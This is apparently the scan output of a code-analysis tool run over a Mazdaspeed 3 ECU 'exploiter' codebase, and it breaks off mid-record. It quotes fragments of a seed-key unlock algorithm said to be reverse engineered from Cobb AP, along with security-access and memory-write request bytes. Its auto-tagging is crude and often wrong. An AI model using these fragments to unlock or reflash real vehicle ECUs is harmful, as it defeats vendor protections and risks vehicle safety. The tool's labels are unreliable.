{"file_path": "agents.md", "lines_read": 43, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "analysis_artifacts/enumerate_files.py", "lines_read": 130, "features_found": [{"type": "function", "name": "get_file_info", "line": 12}, {"type": "function", "name": "enumerate_files", "line": 66}, {"type": "function", "name": "main", "line": 85}, {"type": "import", "module": "pathlib", "line": null}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "os", "line": null}, {"type": "import", "module": "json", "line": null}, {"type": "import", "module": "Path", "line": null}, {"type": "import", "module": "Dict,", "line": null}], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 67, "hardware": "ECU", "content": "\"\"\"Recursively enumerate all files\"\"\""}], "security_logic": [{"type": "security_pattern", "line": 95, "pattern": "key", "content": "files.sort(key=lambda x: x[\"file_path\"])"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "analyze_platforms.py", "lines_read": 210, "features_found": [{"type": "function", "name": "analyze_file_issues", "line": 17}, {"type": "function", "name": "categorize_platform_files", "line": 74}, {"type": "function", "name": "create_implementation_strategy", "line": 112}, {"type": "function", "name": "main", "line": 194}, {"type": "import", "module": "pathlib", "line": null}, {"type": "import", "module": "collections", "line": null}, {"type": "import", "module": "sys", "line": null}, {"type": "import", "module": "os", "line": null}, {"type": "import", "module": "re", "line": null}, {"type": "import", "module": "Path", "line": null}, {"type": "import", "module": "defaultdict", "line": null}, {"type": "import", "module": "{dep}'", "line": null}], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [{"type": "security_pattern", "line": 107, "pattern": "key", "content": "platform_analysis.sort(key=lambda x: x['complexity_score'])"}, {"type": "security_pattern", "line": 163, "pattern": "key", "content": "all_easy.sort(key=lambda x: x[1]['complexity_score'])"}, {"type": "security_pattern", "line": 170, "pattern": "key", "content": "key_platforms = ['versa', 'cobb', 'mds']"}, {"type": "security_pattern", "line": 171, "pattern": "key", "content": "print(f\"\\n\ud83e\udd48 PRIORITY 2 - KEY PLATFORMS (versa, cobb, mds):\")"}, {"type": "security_pattern", "line": 172, "pattern": "key", "content": "for platform in key_platforms:"}, {"type": "security_pattern", "line": 174, "pattern": "key", "content": "files = analysis[platform][:5]  # Top 5 easiest from each key platform"}, {"type": "security_pattern", "line": 186, "pattern": "key", "content": "high_value.sort(key=lambda x: x[1]['complexity_score'])"}, {"type": "security_pattern", "line": 201, "pattern": "key", "content": "print(\"Then focus on PRIORITY 2 key platforms (versa, cobb, mds).\")"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "base_exploiter.py", "lines_read": 591, "features_found": [{"type": "function", "name": "add_warning", "line": 54}, {"type": "function", "name": "__bool__", "line": 58}, {"type": "function", "name": "__init__", "line": 88}, {"type": "function", "name": "set_obd_service", "line": 130}, {"type": "function", "name": "set_can_engine", "line": 135}, {"type": "function", "name": "set_credentials", "line": 140}, {"type": "function", "name": "_validate_security", "line": 256}, {"type": "function", "name": "_validate_memory_access", "line": 273}, {"type": "function", "name": "_log_operation", "line": 436}, {"type": "function", "name": "_create_flash_operation", "line": 476}, {"type": "function", "name": "_update_flash_operation", "line": 491}, {"type": "function", "name": "get_statistics", "line": 510}, {"type": "function", "name": "get_active_operations", "line": 522}, {"type": "function", "name": "reset_statistics", "line": 526}, {"type": "function", "name": "__del__", "line": 587}, {"type": "import", "module": "abc", "line": null}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "models", "line": null}, {"type": "import", "module": "mazda_security_core", "line": null}, {"type": "import", "module": "mazda_memory_map", "line": null}, {"type": "import", "module": "asyncio", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "ABC,", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "dataclass,", "line": null}, {"type": "import", "module": "Enum", "line": null}, {"type": "import", "module": "traceback", "line": null}, {"type": "import", "module": "(", "line": null}, {"type": "import", "module": "MazdaSecurityCore", "line": null}, {"type": "import", "module": "MazdaMemoryMap,", "line": null}], "components_found": [{"type": "class", "name": "ExploiterError", "line": 24}, {"type": "class", "name": "SecurityViolationError", "line": 29}, {"type": "class", "name": "CommunicationError", "line": 34}, {"type": "class", "name": "OperationError", "line": 39}, {"type": "class", "name": "OperationResult", "line": 45}, {"type": "class", "name": "ExploiterConfig", "line": 64}, {"type": "class", "name": "BaseExploiter", "line": 82}], "algorithms": [], "protocols": [{"type": "protocol", "line": 18, "protocol": "CAN", "content": "FlashState, CANMessage, OBDPacket, ExploiterState"}, {"type": "protocol", "line": 18, "protocol": "OBD", "content": "FlashState, CANMessage, OBDPacket, ExploiterState"}, {"type": "protocol", "line": 131, "protocol": "OBD", "content": "\"\"\"Set OBD service interface.\"\"\""}, {"type": "protocol", "line": 133, "protocol": "OBD", "content": "self.logger.info(\"OBD service interface set\")"}, {"type": "protocol", "line": 136, "protocol": "CAN", "content": "\"\"\"Set CAN engine interface.\"\"\""}, {"type": "protocol", "line": 138, "protocol": "CAN", "content": "self.logger.info(\"CAN engine interface set\")"}, {"type": "protocol", "line": 175, "protocol": "OBD", "content": "raise CommunicationError(\"OBD service not set\")"}, {"type": "protocol", "line": 178, "protocol": "CAN", "content": "raise CommunicationError(\"CAN engine not set\")"}, {"type": "protocol", "line": 396, "protocol": "OBD", "content": "data: Optional[bytes] = None) -> OBDPacket:"}, {"type": "protocol", "line": 398, "protocol": "OBD", "content": "Send OBD command with error handling."}, {"type": "protocol", "line": 401, "protocol": "OBD", "content": "mode: OBD command mode"}, {"type": "protocol", "line": 406, "protocol": "OBD", "content": "OBD packet response"}, {"type": "protocol", "line": 409, "protocol": "OBD", "content": "raise CommunicationError(\"OBD service not available\")"}, {"type": "protocol", "line": 416, "protocol": "OBD", "content": "raise CommunicationError(f\"OBD command failed: {e}\")"}, {"type": "protocol", "line": 418, "protocol": "CAN", "content": "async def _send_can_message(self, message: CANMessage) -> bool:"}, {"type": "protocol", "line": 420, "protocol": "CAN", "content": "Send CAN message with error handling."}, {"type": "protocol", "line": 423, "protocol": "CAN", "content": "message: CAN message to send"}, {"type": "protocol", "line": 429, "protocol": "CAN", "content": "raise CommunicationError(\"CAN engine not available\")"}, {"type": "protocol", "line": 434, "protocol": "CAN", "content": "raise CommunicationError(f\"CAN message failed: {e}\")"}, {"type": "protocol", "line": 551, "protocol": "OBD", "content": "raise CommunicationError(\"OBD service not connected\")"}, {"type": "protocol", "line": 554, "protocol": "CAN", "content": "raise CommunicationError(\"CAN engine not connected\")"}], "hardware_assumptions": [{"type": "hardware", "line": 2, "hardware": "ECU", "content": "BaseExploiter - Shared foundation for all ECU exploitation modules."}, {"type": "hardware", "line": 3, "hardware": "ECU", "content": "Provides common security validation, error handling, logging, and communication patterns."}, {"type": "hardware", "line": 10, "hardware": "ABS", "content": "from abc import ABC, abstractmethod"}, {"type": "hardware", "line": 17, "hardware": "ECU", "content": "SecurityLevel, SecurityCredentials, LogEntry, FlashOperation,"}, {"type": "hardware", "line": 20, "hardware": "ECU", "content": "from mazda_security_core import MazdaSecurityCore"}, {"type": "hardware", "line": 29, "hardware": "ECU", "content": "class SecurityViolationError(ExploiterError):"}, {"type": "hardware", "line": 30, "hardware": "ECU", "content": "\"\"\"Security policy violation.\"\"\""}, {"type": "hardware", "line": 40, "hardware": "ECU", "content": "\"\"\"Operation execution failure.\"\"\""}, {"type": "hardware", "line": 51, "hardware": "ECU", "content": "execution_time: float = 0.0"}, {"type": "hardware", "line": 71, "hardware": "ECU", "content": "security_enforcement: bool = True"}, {"type": "hardware", "line": 84, "hardware": "ECU", "content": "Base class for all ECU exploitation modules."}, {"type": "hardware", "line": 85, "hardware": "ECU", "content": "Provides shared functionality for security, communication, error handling, and logging."}, {"type": "hardware", "line": 89, "hardware": "ECU", "content": "security_core: Optional[MazdaSecurityCore] = None):"}, {"type": "hardware", "line": 96, "hardware": "ECU", "content": "security_core: Shared security core instance"}, {"type": "hardware", "line": 104, "hardware": "ECU", "content": "self.current_credentials: Optional[SecurityCredentials] = None"}, {"type": "hardware", "line": 108, "hardware": "ECU", "content": "self.security_core = security_core or MazdaSecurityCore()"}, {"type": "hardware", "line": 120, "hardware": "ECU", "content": "\"security_violations\": 0,"}, {"type": "hardware", "line": 121, "hardware": "ECU", "content": "\"total_execution_time\": 0.0,"}, {"type": "hardware", "line": 122, "hardware": "ECU", "content": "\"average_execution_time\": 0.0,"}, {"type": "hardware", "line": 140, "hardware": "ECU", "content": "def set_credentials(self, credentials: SecurityCredentials) -> None:"}, {"type": "hardware", "line": 142, "hardware": "ECU", "content": "Set security credentials for operations."}, {"type": "hardware", "line": 145, "hardware": "ECU", "content": "credentials: Security credentials"}, {"type": "hardware", "line": 147, "hardware": "ECU", "content": "if not self.security_core.validate_session(credentials.session_token):"}, {"type": "hardware", "line": 148, "hardware": "ECU", "content": "raise SecurityViolationError(\"Invalid or expired credentials\")"}, {"type": "hardware", "line": 184, "hardware": "ECU", "content": "execution_time = time.time() - start_time"}, {"type": "hardware", "line": 186, "hardware": "ECU", "content": "self._log_operation(\"initialize\", operation_id, True, execution_time)"}, {"type": "hardware", "line": 191, "hardware": "ECU", "content": "execution_time=execution_time"}, {"type": "hardware", "line": 196, "hardware": "ECU", "content": "execution_time = time.time() - start_time"}, {"type": "hardware", "line": 199, "hardware": "ECU", "content": "self._log_operation(\"initialize\", operation_id, False, execution_time, error_msg)"}, {"type": "hardware", "line": 205, "hardware": "ECU", "content": "execution_time=execution_time"}, {"type": "hardware", "line": 223, "hardware": "ECU", "content": "execution_time = time.time() - start_time"}, {"type": "hardware", "line": 225, "hardware": "ECU", "content": "self._log_operation(\"shutdown\", operation_id, True, execution_time)"}, {"type": "hardware", "line": 230, "hardware": "ECU", "content": "execution_time=execution_time"}, {"type": "hardware", "line": 234, "hardware": "ECU", "content": "execution_time = time.time() - start_time"}, {"type": "hardware", "line": 237, "hardware": "ECU", "content": "self._log_operation(\"shutdown\", operation_id, False, execution_time, error_msg)"}, {"type": "hardware", "line": 243, "hardware": "ECU", "content": "execution_time=execution_time"}, {"type": "hardware", "line": 246, "hardware": "ABS", "content": "@abstractmethod"}, {"type": "hardware", "line": 251, "hardware": "ABS", "content": "@abstractmethod"}, {"type": "hardware", "line": 256, "hardware": "ECU", "content": "def _validate_security(self, required_level: SecurityLevel,"}, {"type": "hardware", "line": 259, "hardware": "ECU", "content": "Validate security credentials for operation."}, {"type": "hardware", "line": 262, "hardware": "ECU", "content": "required_level: Minimum security level required"}, {"type": "hardware", "line": 266, "hardware": "ECU", "content": "SecurityViolationError: If not authorized"}, {"type": "hardware", "line": 268, "hardware": "ECU", "content": "if self.config.security_enforcement:"}, {"type": "hardware", "line": 269, "hardware": "ECU", "content": "self.security_core.authorize_operation("}, {"type": "hardware", "line": 284, "hardware": "ECU", "content": "SecurityViolationError: If access not permitted"}, {"type": "hardware", "line": 288, "hardware": "ECU", "content": "self.current_credentials.security_level if self.current_credentials else SecurityLevel.NONE,"}, {"type": "hardware", "line": 291, "hardware": "ECU", "content": "raise SecurityViolationError("}, {"type": "hardware", "line": 296, "hardware": "ECU", "content": "async def _execute_with_retry(self, operation: Callable,"}, {"type": "hardware", "line": 300, "hardware": "ECU", "content": "Execute operation with retry logic."}, {"type": "hardware", "line": 303, "hardware": "ECU", "content": "operation: Function to execute"}, {"type": "hardware", "line": 339, "hardware": "ECU", "content": "execution_time = time.time() - start_time"}, {"type": "hardware", "line": 344, "hardware": "ECU", "content": "self.stats[\"total_execution_time\"] += execution_time"}, {"type": "hardware", "line": 345, "hardware": "ECU", "content": "self.stats[\"average_execution_time\"] = ("}, {"type": "hardware", "line": 346, "hardware": "ECU", "content": "self.stats[\"total_execution_time\"] / self.stats[\"total_operations\"]"}, {"type": "hardware", "line": 349, "hardware": "ECU", "content": "self._log_operation(operation_name, operation_id, True, execution_time)"}, {"type": "hardware", "line": 359, "hardware": "ECU", "content": "execution_time=execution_time"}, {"type": "hardware", "line": 375, "hardware": "ECU", "content": "execution_time = time.time() - start_time"}, {"type": "hardware", "line": 382, "hardware": "ECU", "content": "self._log_operation(operation_name, operation_id, False, execution_time, error_msg)"}, {"type": "hardware", "line": 392, "hardware": "ECU", "content": "execution_time=execution_time"}, {"type": "hardware", "line": 437, "hardware": "ECU", "content": "success: bool, execution_time: float,"}, {"type": "hardware", "line": 440, "hardware": "ECU", "content": "Log operation execution."}, {"type": "hardware", "line": 446, "hardware": "ECU", "content": "execution_time: Time taken in seconds"}, {"type": "hardware", "line": 450, "hardware": "ECU", "content": "message = f\"Operation {operation} {'completed' if success else 'failed'} in {execution_time:.3f}s\""}, {"type": "hardware", "line": 462, "hardware": "ECU", "content": "\"execution_time\": execution_time,"}, {"type": "hardware", "line": 468, "hardware": "ECU", "content": "self.security_core.access_log.append(log_entry)"}, {"type": "hardware", "line": 532, "hardware": "ECU", "content": "\"security_violations\": 0,"}, {"type": "hardware", "line": 533, "hardware": "ECU", "content": "\"total_execution_time\": 0.0,"}, {"type": "hardware", "line": 534, "hardware": "ECU", "content": "\"average_execution_time\": 0.0,"}, {"type": "hardware", "line": 558, "hardware": "ECU", "content": "raise SecurityViolationError(\"No credentials set\")"}, {"type": "hardware", "line": 561, "hardware": "ECU", "content": "raise SecurityViolationError(\"Credentials expired\")"}, {"type": "hardware", "line": 567, "hardware": "ECU", "content": "execution_time = time.time() - start_time"}, {"type": "hardware", "line": 573, "hardware": "ECU", "content": "execution_time=execution_time"}, {"type": "hardware", "line": 577, "hardware": "ECU", "content": "execution_time = time.time() - start_time"}, {"type": "hardware", "line": 584, "hardware": "ECU", "content": "execution_time=execution_time"}], "security_logic": [{"type": "security_pattern", "line": 306, "pattern": "key", "content": "**kwargs: Keyword arguments to pass to operation"}, {"type": "security_pattern", "line": 524, "pattern": "key", "content": "return list(self.active_operations.keys())"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "claude.md", "lines_read": 159, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "cobb1.py", "lines_read": 196, "features_found": [{"type": "function", "name": "__init__", "line": 33}, {"type": "function", "name": "_reverse_engineered_seed_algo", "line": 39}, {"type": "function", "name": "send_can_message", "line": 59}, {"type": "function", "name": "receive_can_message", "line": 74}, {"type": "function", "name": "request_seed", "line": 83}, {"type": "function", "name": "send_key", "line": 96}, {"type": "function", "name": "unlock_ecu", "line": 106}, {"type": "function", "name": "read_memory", "line": 125}, {"type": "function", "name": "write_memory", "line": 151}, {"type": "function", "name": "read_ecu_identification", "line": 172}, {"type": "function", "name": "algo", "line": 44}, {"type": "import", "module": "core.ecu_communication", "line": null}, {"type": "import", "module": "core.safety_validator", "line": null}, {"type": "import", "module": "utils.logger", "line": null}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "ECUCommunicator,", "line": null}, {"type": "import", "module": "get_safety_validator", "line": null}, {"type": "import", "module": "get_logger", "line": null}, {"type": "import", "module": "can", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "hashlib", "line": null}, {"type": "import", "module": "List,", "line": null}], "components_found": [{"type": "class", "name": "MZRCANProtocol", "line": 15}], "algorithms": [], "protocols": [{"type": "protocol", "line": 5, "protocol": "CAN", "content": "CAN Bus Protocol Implementation for Mazdaspeed 3 MZR DISI Engine"}, {"type": "protocol", "line": 15, "protocol": "CAN", "content": "class MZRCANProtocol:"}, {"type": "protocol", "line": 17, "protocol": "CAN", "content": "Reverse engineered CAN protocol for Mazda MZR 2.3L DISI Turbo Engine"}, {"type": "protocol", "line": 22, "protocol": "0x[0-9A-Fa-f]+", "content": "ECU_TX_ID = 0x7E0"}, {"type": "protocol", "line": 23, "protocol": "0x[0-9A-Fa-f]+", "content": "ECU_RX_ID = 0x7E8"}, {"type": "protocol", "line": 24, "protocol": "0x[0-9A-Fa-f]+", "content": "DIAGNOSTIC_ID = 0x7DF"}, {"type": "protocol", "line": 25, "protocol": "0x[0-9A-Fa-f]+", "content": "BROADCAST_ID = 0x7E1"}, {"type": "protocol", "line": 28, "protocol": "0x[0-9A-Fa-f]+", "content": "SAFETY_LEVEL = 0x01"}, {"type": "protocol", "line": 29, "protocol": "0x[0-9A-Fa-f]+", "content": "DIAG_LEVEL = 0x03"}, {"type": "protocol", "line": 30, "protocol": "0x[0-9A-Fa-f]+", "content": "FLASH_LEVEL = 0x05"}, {"type": "protocol", "line": 31, "protocol": "0x[0-9A-Fa-f]+", "content": "TUNING_LEVEL = 0x07"}, {"type": "protocol", "line": 46, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = ((seed >> 8) & 0xFF) ^ (seed & 0xFF)"}, {"type": "protocol", "line": 47, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = (temp * 0x201) & 0xFFFF"}, {"type": "protocol", "line": 50, "protocol": "0x[0-9A-Fa-f]+", "content": "temp ^= 0x8147"}, {"type": "protocol", "line": 51, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = (temp + 0x1A2B) & 0xFFFF"}, {"type": "protocol", "line": 54, "protocol": "0x[0-9A-Fa-f]+", "content": "key = ((temp << 8) | (temp >> 8)) & 0xFFFF"}, {"type": "protocol", "line": 55, "protocol": "0x[0-9A-Fa-f]+", "content": "return key ^ 0x55AA"}, {"type": "protocol", "line": 61, "protocol": "CAN", "content": "Send raw CAN message to ECU"}, {"type": "protocol", "line": 76, "protocol": "CAN", "content": "Receive CAN message with timeout"}, {"type": "protocol", "line": 87, "protocol": "0x[0-9A-Fa-f]+", "content": "seed_request = bytes([0x27, level])"}, {"type": "protocol", "line": 91, "protocol": "0x[0-9A-Fa-f]+", "content": "if response and response.data[0] == 0x67:"}, {"type": "protocol", "line": 100, "protocol": "0x[0-9A-Fa-f]+", "content": "key_bytes = bytes([0x27, level + 1, (key >> 8) & 0xFF, key & 0xFF])"}, {"type": "protocol", "line": 104, "protocol": "0x[0-9A-Fa-f]+", "content": "return response and response.data[0] == 0x67"}, {"type": "protocol", "line": 134, "protocol": "0x[0-9A-Fa-f]+", "content": "request_data = bytes([0x23,"}, {"type": "protocol", "line": 135, "protocol": "0x[0-9A-Fa-f]+", "content": "(address >> 16) & 0xFF,"}, {"type": "protocol", "line": 136, "protocol": "0x[0-9A-Fa-f]+", "content": "(address >> 8) & 0xFF,"}, {"type": "protocol", "line": 137, "protocol": "0x[0-9A-Fa-f]+", "content": "address & 0xFF,"}, {"type": "protocol", "line": 145, "protocol": "0x[0-9A-Fa-f]+", "content": "while response and response.data[0] == 0x63:"}, {"type": "protocol", "line": 162, "protocol": "0x[0-9A-Fa-f]+", "content": "request_data = bytes([0x3D]) + struct.pack('>I', address + i)[1:] + chunk"}, {"type": "protocol", "line": 167, "protocol": "0x[0-9A-Fa-f]+", "content": "if not response or response.data[0] != 0x7D:"}, {"type": "protocol", "line": 179, "protocol": "0x[0-9A-Fa-f]+", "content": "self.send_can_message(self.ECU_TX_ID, bytes([0x22, 0xF1, 0x90]))"}, {"type": "protocol", "line": 185, "protocol": "0x[0-9A-Fa-f]+", "content": "self.send_can_message(self.ECU_TX_ID, bytes([0x22, 0xF1, 0x87]))"}, {"type": "protocol", "line": 191, "protocol": "0x[0-9A-Fa-f]+", "content": "self.send_can_message(self.ECU_TX_ID, bytes([0x22, 0xF1, 0x85]))"}], "hardware_assumptions": [{"type": "hardware", "line": 1, "hardware": "ECU", "content": "from core.ecu_communication import ECUCommunicator, ECUResponse, ECUState"}, {"type": "hardware", "line": 5, "hardware": "CAN bus", "content": "CAN Bus Protocol Implementation for Mazdaspeed 3 MZR DISI Engine"}, {"type": "hardware", "line": 6, "hardware": "ECU", "content": "Handles direct ECU communication bypassing Cobb security"}, {"type": "hardware", "line": 22, "hardware": "ECU", "content": "ECU_TX_ID = 0x7E0"}, {"type": "hardware", "line": 23, "hardware": "ECU", "content": "ECU_RX_ID = 0x7E8"}, {"type": "hardware", "line": 35, "hardware": "ECU", "content": "self.security_level = 0"}, {"type": "hardware", "line": 42, "hardware": "ECU", "content": "Mazda uses modified ISO 14230-3 security with custom twists"}, {"type": "hardware", "line": 61, "hardware": "ECU", "content": "Send raw CAN message to ECU"}, {"type": "hardware", "line": 85, "hardware": "ECU", "content": "Request security seed from ECU for given access level"}, {"type": "hardware", "line": 88, "hardware": "ECU", "content": "self.send_can_message(self.ECU_TX_ID, seed_request)"}, {"type": "hardware", "line": 98, "hardware": "ECU", "content": "Send security key to ECU to unlock access level"}, {"type": "hardware", "line": 101, "hardware": "ECU", "content": "self.send_can_message(self.ECU_TX_ID, key_bytes)"}, {"type": "hardware", "line": 106, "hardware": "ECU", "content": "def unlock_ecu(self, target_level: int) -> bool:"}, {"type": "hardware", "line": 108, "hardware": "ECU", "content": "Full security access unlock sequence"}, {"type": "hardware", "line": 110, "hardware": "ECU", "content": "for level in range(self.security_level + 1, target_level + 1):"}, {"type": "hardware", "line": 121, "hardware": "ECU", "content": "self.security_level = target_level"}, {"type": "hardware", "line": 127, "hardware": "ECU", "content": "Read ECU memory at specified address"}, {"type": "hardware", "line": 140, "hardware": "ECU", "content": "self.send_can_message(self.ECU_TX_ID, request_data)"}, {"type": "hardware", "line": 153, "hardware": "ECU", "content": "Write data to ECU memory address"}, {"type": "hardware", "line": 156, "hardware": "ECU", "content": "if not self.session_active or self.security_level < self.TUNING_LEVEL:"}, {"type": "hardware", "line": 159, "hardware": "ECU", "content": "chunk_size = 4  # ECU accepts 4 bytes per write"}, {"type": "hardware", "line": 164, "hardware": "ECU", "content": "self.send_can_message(self.ECU_TX_ID, request_data)"}, {"type": "hardware", "line": 172, "hardware": "ECU", "content": "def read_ecu_identification(self) -> Dict[str, str]:"}, {"type": "hardware", "line": 174, "hardware": "ECU", "content": "Read ECU identification information"}, {"type": "hardware", "line": 179, "hardware": "ECU", "content": "self.send_can_message(self.ECU_TX_ID, bytes([0x22, 0xF1, 0x90]))"}, {"type": "hardware", "line": 185, "hardware": "ECU", "content": "self.send_can_message(self.ECU_TX_ID, bytes([0x22, 0xF1, 0x87]))"}, {"type": "hardware", "line": 188, "hardware": "ECU", "content": "ident_data['ECU_PN'] = response.data[2:].hex().upper()"}, {"type": "hardware", "line": 191, "hardware": "ECU", "content": "self.send_can_message(self.ECU_TX_ID, bytes([0x22, 0xF1, 0x85]))"}], "security_logic": [{"type": "security_pattern", "line": 12, "pattern": "hash", "content": "import hashlib"}, {"type": "security_pattern", "line": 36, "pattern": "key", "content": "self.seed_key_algorithm = self._reverse_engineered_seed_algo()"}, {"type": "security_pattern", "line": 36, "pattern": "seed", "content": "self.seed_key_algorithm = self._reverse_engineered_seed_algo()"}, {"type": "security_pattern", "line": 36, "pattern": "algorithm", "content": "self.seed_key_algorithm = self._reverse_engineered_seed_algo()"}, {"type": "security_pattern", "line": 39, "pattern": "seed", "content": "def _reverse_engineered_seed_algo(self):"}, {"type": "security_pattern", "line": 41, "pattern": "key", "content": "Reverse engineered seed-key algorithm from Cobb AP"}, {"type": "security_pattern", "line": 41, "pattern": "seed", "content": "Reverse engineered seed-key algorithm from Cobb AP"}, {"type": "security_pattern", "line": 41, "pattern": "algorithm", "content": "Reverse engineered seed-key algorithm from Cobb AP"}, {"type": "security_pattern", "line": 44, "pattern": "seed", "content": "def algo(seed: int) -> int:"}, {"type": "security_pattern", "line": 46, "pattern": "seed", "content": "temp = ((seed >> 8) & 0xFF) ^ (seed & 0xFF)"}, {"type": "security_pattern", "line": 54, "pattern": "key", "content": "key = ((temp << 8) | (temp >> 8)) & 0xFFFF"}, {"type": "security_pattern", "line": 55, "pattern": "key", "content": "return key ^ 0x55AA"}, {"type": "security_pattern", "line": 83, "pattern": "seed", "content": "def request_seed(self, level: int) -> Optional[int]:"}, {"type": "security_pattern", "line": 85, "pattern": "seed", "content": "Request security seed from ECU for given access level"}, {"type": "security_pattern", "line": 87, "pattern": "seed", "content": "seed_request = bytes([0x27, level])"}, {"type": "security_pattern", "line": 88, "pattern": "seed", "content": "self.send_can_message(self.ECU_TX_ID, seed_request)"}, {"type": "security_pattern", "line": 92, "pattern": "seed", "content": "seed = (response.data[2] << 8) | response.data[3]"}, {"type": "security_pattern", "line": 93, "pattern": "seed", "content": "return seed"}, {"type": "security_pattern", "line": 96, "pattern": "key", "content": "def send_key(self, level: int, key: int) -> bool:"}, {"type": "security_pattern", "line": 98, "pattern": "key", "content": "Send security key to ECU to unlock access level"}, {"type": "security_pattern", "line": 100, "pattern": "key", "content": "key_bytes = bytes([0x27, level + 1, (key >> 8) & 0xFF, key & 0xFF])"}, {"type": "security_pattern", "line": 101, "pattern": "key", "content": "self.send_can_message(self.ECU_TX_ID, key_bytes)"}, {"type": "security_pattern", "line": 111, "pattern": "seed", "content": "seed = self.request_seed(level)"}, {"type": "security_pattern", "line": 112, "pattern": "seed", "content": "if not seed:"}, {"type": "security_pattern", "line": 115, "pattern": "key", "content": "key = self.seed_key_algorithm(seed)"}, {"type": "security_pattern", "line": 115, "pattern": "seed", "content": "key = self.seed_key_algorithm(seed)"}, {"type": "security_pattern", "line": 115, "pattern": "algorithm", "content": "key = self.seed_key_algorithm(seed)"}, {"type": "security_pattern", "line": 116, "pattern": "key", "content": "if not self.send_key(level, key):"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["cobb"]}
{"file_path": "cobb10.py", "lines_read": 201, "features_found": [{"type": "function", "name": "__init__", "line": 54}, {"type": "function", "name": "connect_obd", "line": 58}, {"type": "function", "name": "read_pid", "line": 74}, {"type": "function", "name": "_parse_pid_response", "line": 99}, {"type": "function", "name": "read_dtc", "line": 143}, {"type": "function", "name": "_parse_dtc_bytes", "line": 163}, {"type": "function", "name": "clear_dtc", "line": 177}, {"type": "function", "name": "read_all_realtime_data", "line": 185}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "Dict,", "line": null}], "components_found": [{"type": "class", "name": "OBD2Protocol", "line": 10}], "algorithms": [], "protocols": [{"type": "protocol", "line": 2, "protocol": "OBD", "content": "OBD-II Protocol Implementation for Mazdaspeed 3"}, {"type": "protocol", "line": 3, "protocol": "OBD", "content": "Provides standard OBD-II functionality alongside Cobb-specific features"}, {"type": "protocol", "line": 10, "protocol": "OBD", "content": "class OBD2Protocol:"}, {"type": "protocol", "line": 12, "protocol": "OBD", "content": "OBD-II protocol implementation with Mazdaspeed 3 extensions"}, {"type": "protocol", "line": 13, "protocol": "PID", "content": "Supports standard PIDs and Mazda-specific proprietary PIDs"}, {"type": "protocol", "line": 17, "protocol": "PID", "content": "STANDARD_PIDS = {"}, {"type": "protocol", "line": 18, "protocol": "0x[0-9A-Fa-f]+", "content": "0x00: \"PIDs supported [01-20]\","}, {"type": "protocol", "line": 18, "protocol": "PID", "content": "0x00: \"PIDs supported [01-20]\","}, {"type": "protocol", "line": 19, "protocol": "0x[0-9A-Fa-f]+", "content": "0x04: \"Calculated engine load\","}, {"type": "protocol", "line": 20, "protocol": "0x[0-9A-Fa-f]+", "content": "0x05: \"Engine coolant temperature\","}, {"type": "protocol", "line": 21, "protocol": "0x[0-9A-Fa-f]+", "content": "0x0C: \"Engine RPM\","}, {"type": "protocol", "line": 22, "protocol": "0x[0-9A-Fa-f]+", "content": "0x0D: \"Vehicle speed\","}, {"type": "protocol", "line": 23, "protocol": "0x[0-9A-Fa-f]+", "content": "0x0F: \"Intake air temperature\","}, {"type": "protocol", "line": 24, "protocol": "0x[0-9A-Fa-f]+", "content": "0x11: \"Throttle position\","}, {"type": "protocol", "line": 25, "protocol": "OBD", "content": "0x1C: \"OBD standards this vehicle conforms to\","}, {"type": "protocol", "line": 25, "protocol": "0x[0-9A-Fa-f]+", "content": "0x1C: \"OBD standards this vehicle conforms to\","}, {"type": "protocol", "line": 26, "protocol": "0x[0-9A-Fa-f]+", "content": "0x21: \"Distance traveled with MIL on\""}, {"type": "protocol", "line": 30, "protocol": "PID", "content": "MAZDA_PIDS = {"}, {"type": "protocol", "line": 31, "protocol": "0x[0-9A-Fa-f]+", "content": "0x01: \"Boost pressure (actual)\","}, {"type": "protocol", "line": 32, "protocol": "0x[0-9A-Fa-f]+", "content": "0x02: \"Boost pressure (target)\","}, {"type": "protocol", "line": 33, "protocol": "0x[0-9A-Fa-f]+", "content": "0x03: \"Wastegate duty cycle\","}, {"type": "protocol", "line": 34, "protocol": "0x[0-9A-Fa-f]+", "content": "0x04: \"VVT intake actual\","}, {"type": "protocol", "line": 35, "protocol": "0x[0-9A-Fa-f]+", "content": "0x05: \"VVT intake target\","}, {"type": "protocol", "line": 36, "protocol": "0x[0-9A-Fa-f]+", "content": "0x06: \"VVT exhaust actual\","}, {"type": "protocol", "line": 37, "protocol": "0x[0-9A-Fa-f]+", "content": "0x07: \"VVT exhaust target\","}, {"type": "protocol", "line": 38, "protocol": "0x[0-9A-Fa-f]+", "content": "0x08: \"Knock retard cylinder 1\","}, {"type": "protocol", "line": 39, "protocol": "0x[0-9A-Fa-f]+", "content": "0x09: \"Knock retard cylinder 2\","}, {"type": "protocol", "line": 40, "protocol": "0x[0-9A-Fa-f]+", "content": "0x0A: \"Knock retard cylinder 3\","}, {"type": "protocol", "line": 41, "protocol": "0x[0-9A-Fa-f]+", "content": "0x0B: \"Knock retard cylinder 4\","}, {"type": "protocol", "line": 42, "protocol": "0x[0-9A-Fa-f]+", 